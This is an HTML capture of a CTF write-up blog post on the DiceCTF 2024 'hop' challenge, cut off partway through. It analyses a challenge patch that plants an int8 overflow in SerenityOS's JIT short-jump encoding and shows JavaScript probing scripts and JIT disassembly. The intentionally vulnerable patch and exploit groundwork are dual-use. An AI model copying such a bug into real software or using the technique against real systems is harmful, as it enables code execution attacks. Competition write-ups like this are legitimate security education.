@@ -1,0 +1,1681 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DiceCTF 2024 Quals - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="DiceCTF 2024 Quals" />
+<meta property="og:description" content="Writeup for DiceCTF 2024 Quals" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chovid99.github.io/posts/dicectf-2024-quals/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-05T04:00:00+07:00" />
+<meta property="article:modified_time" content="2024-02-05T04:00:00+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="DiceCTF 2024 Quals"/>
+<meta name="twitter:description" content="Writeup for DiceCTF 2024 Quals"/>
+<meta name="twitter:site" content="@Chovid99"/>
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/dicectf-2024-quals/" /><link rel="prev" href="https://chovid99.github.io/posts/real-world-ctf-2024/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DiceCTF 2024 Quals",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/dicectf-2024-quals\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, pwn, heap, javascript, serenity, 2024","wordcount":  4856 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/dicectf-2024-quals\/","datePublished": "2024-02-05T04:00:00+07:00","dateModified": "2024-02-05T04:00:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Chovid99"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DiceCTF 2024 Quals</h1><div class="post-meta">
+            <div class="post-meta-line">
+                </div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Feb 05, 2024">Feb 05, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4856 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;23 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#hop">hop</a>
+          <ul>
+            <li><a href="#initial-analysis">Initial Analysis</a></li>
+            <li><a href="#solution">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#boogie-woogie">boogie-woogie</a>
+          <ul>
+            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
+            <li><a href="#solution-1">Solution</a>
+              <ul>
+                <li><a href="#brute-force-heap-offset">Brute-force heap offset</a></li>
+                <li><a href="#leak-libc-address">Leak <code>libc</code> address</a></li>
+                <li><a href="#exploitation-via-link_map">Exploitation via <code>link_map</code></a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/llysqqr.png" title="https://i.imgur.com/llysqqr.png" data-thumbnail="https://i.imgur.com/llysqqr.png" data-sub-html="<h2>DiceCTF 2024 Quals. We secured the first place</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/llysqqr.png"
+            data-srcset="https://i.imgur.com/llysqqr.png, https://i.imgur.com/llysqqr.png 1.5x, https://i.imgur.com/llysqqr.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/llysqqr.png" />
+    </a><figcaption class="image-caption">DiceCTF 2024 Quals. We secured the first place</figcaption>
+    </figure>
+<p>I played with the <strong>Blue Water</strong> team in the DiceCTF 2024 Quals. We managed to secure the <strong>first place</strong>. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during it!</p>
+<p>Below is the writeup for the pwn challenges that I managed to solve.</p>
+<h1 id="pwn">Pwn</h1>
+<h2 id="hop">hop</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Using 32 bits to encode a short jump is so wasteful&hellip; this will surely be better🐞🤓</p>
+<p>nc mc.ax 32421</p>
+</div>
+        </div>
+    </div>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>In this challenge, we were provided with a <code>zip</code> file containing the <code>Dockerfile</code> used to build the challenge, along with a <code>patch</code> file. Below is the content of the <code>patch</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Base: https://github.com/SerenityOS/serenity/tree/fbde901614368dcf03d4a8eee800d8b89131465f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">diff --git a/Userland/Libraries/LibJIT/X86_64/Assembler.h b/Userland/Libraries/LibJIT/X86_64/Assembler.h
+</span></span><span class="line"><span class="cl">index 79b96cf81f..465c4cb38c 100644
+</span></span><span class="line"><span class="cl">--- a/Userland/Libraries/LibJIT/X86_64/Assembler.h
+</span></span><span class="line"><span class="cl">+++ b/Userland/Libraries/LibJIT/X86_64/Assembler.h
+</span></span><span class="line"><span class="cl">@@ -472,12 +472,23 @@ struct X86_64Assembler {
+</span></span><span class="line"><span class="cl">     private:
+</span></span><span class="line"><span class="cl">         void link_jump(X86_64Assembler&amp; assembler, size_t offset_in_instruction_stream)
+</span></span><span class="line"><span class="cl">         {
+</span></span><span class="line"><span class="cl">-            auto offset = offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream;
+</span></span><span class="line"><span class="cl">+            auto offset = static_cast&lt;ssize_t&gt;(offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream);
+</span></span><span class="line"><span class="cl">             auto jump_slot = offset_in_instruction_stream - 4;
+</span></span><span class="line"><span class="cl">-            assembler.m_output[jump_slot + 0] = (offset &gt;&gt; 0) &amp; 0xff;
+</span></span><span class="line"><span class="cl">-            assembler.m_output[jump_slot + 1] = (offset &gt;&gt; 8) &amp; 0xff;
+</span></span><span class="line"><span class="cl">-            assembler.m_output[jump_slot + 2] = (offset &gt;&gt; 16) &amp; 0xff;
+</span></span><span class="line"><span class="cl">-            assembler.m_output[jump_slot + 3] = (offset &gt;&gt; 24) &amp; 0xff;
+</span></span><span class="line"><span class="cl">+            if (offset &lt;= INT8_MAX &amp;&amp; offset &gt;= INT8_MIN &amp;&amp; assembler.m_output[jump_slot - 1] == 0xE9) {
+</span></span><span class="line"><span class="cl">+                auto small_offset = static_cast&lt;int8_t&gt;(offset + 3);
+</span></span><span class="line"><span class="cl">+                // JMP rel8
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot - 1] = 0xEB;
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 0] = small_offset;
+</span></span><span class="line"><span class="cl">+                // NOP3_OVERRIDE_NOP
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 1] = 0x0F;
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 2] = 0x1F;
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 3] = 0x00;
+</span></span><span class="line"><span class="cl">+            } else {
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 0] = (offset &gt;&gt; 0) &amp; 0xff;
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 1] = (offset &gt;&gt; 8) &amp; 0xff;
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 2] = (offset &gt;&gt; 16) &amp; 0xff;
+</span></span><span class="line"><span class="cl">+                assembler.m_output[jump_slot + 3] = (offset &gt;&gt; 24) &amp; 0xff;
+</span></span><span class="line"><span class="cl">+            }
+</span></span><span class="line"><span class="cl">         }
+</span></span><span class="line"><span class="cl">     };
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The patch targets the <code>JIT</code> (Just-In-Time compilation) code of <code>LibJS</code> in <code>SerenityOS</code>. Examining the patch reveals a significant bug. The intention behind the patch is to replace a relative <code>JMP offset</code> instruction with a relative <code>JMP short offset</code>. However, an issue arises in how the <code>small_offset</code> is calculated. By adding <code>3</code> to the <code>offset</code> and then casting it to <code>int8_t</code>, if the result of <code>offset + 3</code> exceeds <code>INT8_MAX</code>, it leads to an overflow, resulting in a negative offset. Consequently, the JIT-compiled code behaves incorrectly. Instead of jumping forward to the intended destination, the overflow causes a jump to a preceding instruction, disrupting the intended flow of execution.</p>
+<h3 id="solution">Solution</h3>
+<p>Based on the bug we identified, let&rsquo;s start by setting up our local environment. The first step involves cloning the <code>SerenityOS</code> repository and applying the patch.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/SerenityOS/serenity/
+</span></span><span class="line"><span class="cl">cd serenity
+</span></span><span class="line"><span class="cl">git checkout fbde901614368dcf03d4a8eee800d8b89131465f
+</span></span><span class="line"><span class="cl">git apply ../patch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Before proceeding to build the <code>js</code> engine, a small adjustment will simplify our debugging process. Navigate to the <code>serenity/Userland/Libraries/LibJS/JIT/Compiler.cpp</code> file and modify the <code>DUMP_JIT_DISASSEMBLY</code> value to <code>1</code>. This adjustment ensures that whenever we execute JavaScript code using the <code>js</code> engine that triggers JIT compilation, the engine will automatically dump the disassembly of the JIT-compiled code. With this setting enabled, we are now ready to proceed with building the <code>js</code> engine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./Meta/serenity.sh build lagom js
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First, we&rsquo;ll begin by crafting a simple script to examine the JIT-compiled code&rsquo;s behavior.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="mi">42424242</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">test</span><span class="p">();}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Hello World&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Block 2:
+</span></span><span class="line"><span class="cl">2:0 LoadImmediate undefined:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c266  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c26d  00 fe 7f
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c270  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">2:20 LoadImmediate 41414141:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c273  48 b8 fd ed 77 02 00  mov    rax, 0x7ffa00000277edfd
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c27a  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c27d  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">2:40 Return:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c280  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c283  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c287  eb 47                 jmp    short 1cc5c2d0 &lt;common_exit&gt;
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c289  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 3:
+</span></span><span class="line"><span class="cl">3:0 LoadImmediate undefined:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c28c  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c293  00 fe 7f
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c296  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">3:20 Jump @4:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c299  eb 03                 jmp    short 1cc5c29e &lt;Block 4&gt;
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c29b  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 4:
+</span></span><span class="line"><span class="cl">4:0 NewPrimitiveArray [ 42424242 ]:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c29e  48 be 48 2c 81 b6 5f  mov    rsi, 0x0000555fb6812c48
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2a5  55 00 00
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2a8  ba 01 00 00 00        mov    edx, 0x00000001
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2ad  57                    push   rdi
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2ae  6a 00                 push   0x00
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2b0  48 b8 d0 37 0a 1d c1  mov    rax, 0x00007fc11d0a37d0
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2b7  7f 00 00
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2ba  ff d0                 call   eax
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2bc  48 83 c4 08           add    rsp,0x08
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2c0  5f                    pop    rdi
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2c1  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">4:20 Return:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2c4  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2c7  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2cb  eb 03                 jmp    short 1cc5c2d0 &lt;common_exit&gt;
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2cd  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">common_exit:
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2d0  4c 89 23              mov    [rbx],r12
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2d3  41 5f                 pop    r15
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2d5  41 5e                 pop    r14
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2d7  41 5d                 pop    r13
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2d9  41 5c                 pop    r12
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2db  5b                    pop    rbx
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2dc  5b                    pop    rbx
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2dd  c9                    leave
+</span></span><span class="line"><span class="cl">0x00007fc11cc5c2de  c3                    ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon analyzing the dumped results, we notice that each <code>return</code> statement triggers a relative <code>JMP</code> instruction to <code>common_exit</code>, which the patch then converts into a <code>jmp short</code>. Observing the disassembly, our goal becomes clear: to extend the <code>jmp short</code> offset when returning <code>41414141</code>. The presence of <code>return [42424242]</code> in the JIT-compiled code, as mentioned above, indicates that to enlarge the <code>jmp short</code> offset for returning <code>41414141</code>, we can simply incorporate multiple values to be returned in that line. For instance, altering the script as follows increases the <code>offset</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">41414141</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="mi">42424242</span><span class="p">],</span> <span class="mi">43434343</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">test</span><span class="p">();}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Hello World&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Block 2:
+</span></span><span class="line"><span class="cl">2:0 LoadImmediate undefined:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac266  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
+</span></span><span class="line"><span class="cl">0x00007f4c10fac26d  00 fe 7f
+</span></span><span class="line"><span class="cl">0x00007f4c10fac270  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">2:20 LoadImmediate 41414141:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac273  48 b8 fd ed 77 02 00  mov    rax, 0x7ffa00000277edfd
+</span></span><span class="line"><span class="cl">0x00007f4c10fac27a  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f4c10fac27d  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">2:40 Return:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac280  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007f4c10fac283  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007f4c10fac287  eb 54                 jmp    short 10fac2dd &lt;common_exit&gt; &lt;- TARGET
+</span></span><span class="line"><span class="cl">0x00007f4c10fac289  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 3:
+</span></span><span class="line"><span class="cl">3:0 LoadImmediate undefined:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac28c  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
+</span></span><span class="line"><span class="cl">0x00007f4c10fac293  00 fe 7f
+</span></span><span class="line"><span class="cl">0x00007f4c10fac296  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">3:20 Jump @4:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac299  eb 03                 jmp    short 10fac29e &lt;Block 4&gt;
+</span></span><span class="line"><span class="cl">0x00007f4c10fac29b  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 4:
+</span></span><span class="line"><span class="cl">4:0 NewPrimitiveArray [ 42424242 ]:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac29e  48 be 68 0c ff e2 da  mov    rsi, 0x000055dae2ff0c68
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2a5  55 00 00
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2a8  ba 01 00 00 00        mov    edx, 0x00000001
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2ad  57                    push   rdi
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2ae  6a 00                 push   0x00
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2b0  48 b8 d0 37 6a 11 4c  mov    rax, 0x00007f4c116a37d0
